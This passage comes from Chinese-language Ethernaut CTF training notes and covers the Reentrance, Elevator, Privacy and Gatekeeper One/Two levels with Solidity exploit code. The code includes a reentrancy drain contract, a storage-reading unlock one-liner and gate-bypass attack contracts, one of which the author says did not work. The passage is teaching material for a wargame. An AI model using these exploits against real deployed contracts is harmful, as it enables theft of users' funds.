&#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-9"><a href="#合约分析-9" class="headerlink" title="合约分析"></a>合约分析</h5><p>从上面的源代码可以确定这里应该为以太坊里的重入攻击，这也是之前<code>The DAO事</code>里黑客所用到的攻击。<br>在这里我们重点来看<code>withdraw函数</code>，我们可以看到它接收了一个_amount参数，将其与发送者的balance进行比较，不超过发送者的balance就将这些_amount发送给sender，同时我们注意到这里它用来发送ether的函数是call.value,发送完成后，它才在下面更新了sender的balances，这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它<code>卡在call.value这里不断给我们发送ether</code>，同样利用的是我们熟悉的<code>fallback函数</code>来实现。</p>
<p>当然，这里还有另外一个关键的地方——call.value函数特性，当我们使用call.value()来调用代码时，<code>执行的代码会被赋予账户所有可用的gas</code>,这样就能保证我们的fallback函数能被顺利执行，对应的，如果我们使用transfer和send函数来发送时，代码可用的gas仅有2300而已，这点gas可能仅仅只够捕获一个event，所以也将无法进行可重入攻击，因为send本来就是transfer的底层实现，所以他两性质也差不多。</p>
<p>根据上面的简易分析，我们可以编写一下EXP代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.2;</span><br><span class="line"></span><br><span class="line">import &#x27;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract ReentrancePoc &#123;</span><br><span class="line"></span><br><span class="line">    Reentrance reInstance;</span><br><span class="line"></span><br><span class="line">    function getEther() public &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address payable  _addr) public payable &#123;</span><br><span class="line">        reInstance = Reentrance(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    function callDonate() public payable&#123;</span><br><span class="line">        reInstance.donate.value(msg.value)(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        reInstance.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">      if(address(reInstance).balance &gt;= 0.001 ether)&#123;</span><br><span class="line">        reInstance.withdraw(0.001 ether);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-9"><a href="#攻击流程-9" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new Instance”来获取一个实例：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322103455617.png" alt="image-20240322103455617"></p>
<p>之后在remix中部署攻击合约<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322103934570.png" alt="image-20240322103934570"><br>我们需要在受攻击的合约里给我们的攻击合约地址增加一些balance以完成withdraw第一步的检查：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.donate(&quot;0x88C011679B3822AcBaA23E3Eb7d5E1545446EC52&quot;,&#123;value: toWei(&quot;0.001&quot;)&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322104042019.png" alt="image-20240322104042019"></p>
<p>这样就成功给我们的攻击合约的balance增加了0.001 ether，这时你再使用getbalance去看合约拥有的eth就会发现变成了0.002，它本来上面存了0.001个eth，然后我们返回攻击合约运行attack函数就可以完成攻击了:<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322104227656.png" alt="image-20240322104227656"><br>查看balance,在交易前后的变化：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322104157531.png" alt="image-20240322104157531"></p>
<p>然后运行getEther函数去将代币从合约提取到账户<img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322104320508.png" alt="image-20240322104320508"></p>
<p>最后点击“submit instance”来提交示例即可：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322104420258.png" alt="image-20240322104420258"></p>
<h3 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h3><h5 id="闯关条件"><a href="#闯关条件" class="headerlink" title="闯关条件"></a>闯关条件</h5><p>这个电梯似乎并不会让你到达顶层，所以我们的闯关条件就是绕过这一限制</p>
<h5 id="合约代码-10"><a href="#合约代码-10" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-10"><a href="#合约分析-10" class="headerlink" title="合约分析"></a>合约分析</h5><p>在合约的开头处有一个Building接口，定义了isLastFloor函数，返回值是bool，应该是用来返回这一楼层是否为最顶层，在接口里没有函数是已实现的，类似于抽象合约，可以理解为它仅仅用来提供一个标准，这样继承于它的合约就可以遵照它的标准来进行交互，而接口内的函数在其调用合约内定义即可。</p>
<p>之后在下面的主合约里，定义了一个bool型的top变量，在goto函数里对传入的_floor变量进行了判断，从逻辑上我们发现判断的条件里如果isLastFloor返回false，通过if后再将isLastFloor的返回值赋给top，这样的话我们的top还是个false，而这里我们要想让top的值变为true，那么我们得想个办法在isLastFloor上动动手脚，由于goTo函数调用了两次isLastFloor，因此我们可以将该函数构造为取反函数即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line">  Elevator ele;</span><br><span class="line">  bool t = true;</span><br><span class="line">  constructor(address _addr)</span><br><span class="line">  &#123;</span><br><span class="line">    ele = Elevator(_addr);</span><br><span class="line">  &#125;</span><br><span class="line">  function isLastFloor(uint)   public returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    t = !t;</span><br><span class="line">    return t;</span><br><span class="line">  &#125;</span><br><span class="line">  function attack()  public  &#123;</span><br><span class="line">    ele.goTo(5);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-10"><a href="#攻击流程-10" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击”Get new Instance”来获取一个实例：</p>
<p>之后获取合约的地址和当前top的值：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322112124988.png" alt="image-20240322112124988">之后在remix中部署合约：之后调用attack来实施攻击，并且将合约地址进行传参：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322112155790.png" alt="image-20240322112155790"></p>
<p>之后查看top值发现已经变为了true：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322112253909.png" alt="image-20240322112253909"><br>之后点击“submit instance”来提交示例：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322112341871.png" alt="image-20240322112341871"></p>
<h3 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h3><h5 id="闯关条件-1"><a href="#闯关条件-1" class="headerlink" title="闯关条件"></a>闯关条件</h5><p>将locked成为false</p>
<h5 id="合约代码-11"><a href="#合约代码-11" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-11"><a href="#合约分析-11" class="headerlink" title="合约分析"></a>合约分析</h5><p>根据solidity 文档中的变量存储原则,evm每一次处理32个字节,而不足32字节的变量相互共享并补齐32字节。 那么我们简单分析下题目中的变量，这个和C语言里面是类似的，就是变量之间共享一段空间那种：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bool public locked = true;  //1 字节 01</span><br><span class="line">uint256 public  ID = block.timestamp; //32 字节</span><br><span class="line">uint8 private flattening = 10; //1 字节 0a</span><br><span class="line">uint8 private denomination = 255;//1 字节 ff</span><br><span class="line">uint16 private awkwardness = uint16(now);//2 字节</span><br><span class="line">bytes32[3] private data;</span><br></pre></td></tr></table></figure>

<p>第一个32 字节就是由<code>locked组成</code>,因为第二个ID占了32个字节，于是不能和locked组成一个块，</p>
<p>第二个32字节就是<code>ID</code>了，32个字节刚好一个块</p>
<p>第三个32字节就是 <code>flattening、denomination、awkwardness</code>组成，因为data是32字节的，所以从</p>
<p>第四个32 字节开始就是 data。 因为我们需要的是data[2],是第三个，因此只需要将第六个存储槽内容取出即可。</p>
<p>查看一下结构是否满足</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322185120703.png" alt="image-20240322185120703"></p>
<p>发现确实和我们想象的一样</p>
<p> 取出语句并提交：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">5</span>,<span class="keyword">function</span>(<span class="params">x,y</span>)&#123; contract.<span class="title function_">unlock</span>(y.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">34</span>));&#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>注释</p>
<blockquote>
<p>由于常量(constant)是无需存储的，所以constant类型的变量是不用在块计算里面的</p>
</blockquote>
</li>
</ul>
<h5 id="攻击流程-11"><a href="#攻击流程-11" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new instance”来获取一个实例：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322185239570.png" alt="image-20240322185239570"></p>
<p>之后将第6个存储槽内容取出，并将前16字节内容提取出来提交由于unlock：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">5</span>,<span class="keyword">function</span>(<span class="params">x,y</span>)&#123; contract.<span class="title function_">unlock</span>(y.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">34</span>));&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322185401970.png" alt="image-20240322185401970"><br>之后查看locked的状态，已变为“flase”<br>之后点击“submit instance”来提交该实例：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240322185518553.png" alt="image-20240322185518553"></p>
<p>在以太坊链上, 没有什么是私有的 private 关键词只是 solidity 中人为规定的一个结构. Web3 的 <code>getStorageAt(...)</code> 可以读取 storage 中的任何信息, 虽然有些数据读取的时候会比较麻烦. 因为 一些优化的技术和原则, 这些技术和原则是为了尽可能压缩 storage 使用的空间.</p>
<p>这不会比这个关卡中暴露的复杂太多. 更多的信息, 可以参见 “Darius” 写的这篇详细的文章: <a target="_blank" rel="noopener" href="https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925">How to read Ethereum contract storage</a></p>
<h3 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h3><h5 id="闯关条件-2"><a href="#闯关条件-2" class="headerlink" title="闯关条件"></a>闯关条件</h5><p>绕过三个函数修饰器的限制。</p>
<h5 id="合约代码-12"><a href="#合约代码-12" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(msg.gas.mod(8191) == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-12"><a href="#合约分析-12" class="headerlink" title="合约分析"></a>合约分析</h5><p>从上面了解到要想enter需要满足gateOne、gateTwo、gateThree三个修饰器的检查条件，即需要满足以下条件：<br>1、gateOne ：这个通过部署一个中间恶意合约即可绕过<br>2、gateTwo ：这里的msg.gas 指的是运行到当前指令还剩余的 gas 量，要能整除 8191。那我们只需要 8191+x ，x 为从开始到运行完 msg.gas 所消耗的 gas。通过查阅资料发现msg.gas在文档里的描述是remaining gas，在Javascript VM环境下进行Debug可在Step detail 栏中可以看到这个变量，笔者在调试过程中未发现合适的gas值，暂未成功！<br>3、gateThree() 也比较简单，将 tx.origin 倒数三四字节换成 0000 即可。 bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF 即可满足条件。<br>根据上面的分析给出EXP代码如下(笔者这里没有成功，主要是gateTwo的问题，没有找到合适的gas，而且编译器不同，初始gas值不同都会影响)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(msg.gas % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    bytes8 _gateKey = bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF;</span><br><span class="line"></span><br><span class="line">    GatekeeperOne target = GatekeeperOne(instance_address);</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.call.gas(适当的gas)(bytes4(keccak256(&quot;enter(bytes8)&quot;)), _gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-12"><a href="#攻击流程-12" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>虽然没有成功，但是这里思路是正确的，下面简单给一下流程，首先点击“Get new instance”来获取一个实例：<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201154552-df573c9a-44c6-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201154552-df573c9a-44c6-1.png" alt="img"></a><br>获取实例地址<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201154614-ec684708-44c6-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201154614-ec684708-44c6-1.png" alt="img"></a><br>之后部署并编译攻击合约，同时更改实例合约的地址：<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201154637-fa15d58c-44c6-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201154637-fa15d58c-44c6-1.png" alt="img"></a><br>之后点击”hack”来实施攻击<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201154712-0efcab7e-44c7-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201154712-0efcab7e-44c7-1.png" alt="img"></a><br>之后当“await contract.entrant()”非0x000…000时点击“submit instance”来提交示例即可！</p>
<h3 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h3><h5 id="闯关要求-10"><a href="#闯关要求-10" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>和上一题一样，完成三个需求。</p>
<h5 id="合约代码-13"><a href="#合约代码-13" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-13"><a href="#合约分析-13" class="headerlink" title="合约分析"></a>合约分析</h5><p>第一个条件：我们可以通过部署合约来实现绕过<br>第二个条件：gateTwo中extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。条件为调用方代码大小为0 ，由于合约在初始化，代码大小为0的。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。<br>第三个条件：这里判断的是msg.sender，所以要在代码里进行实时计算。异或的特性就是异或两次就是原数据。所以将sender和FFFFFFFFFFFFFFFF进行异或的值就是我们想要的值。<br>最后攻击合约如下：</p>
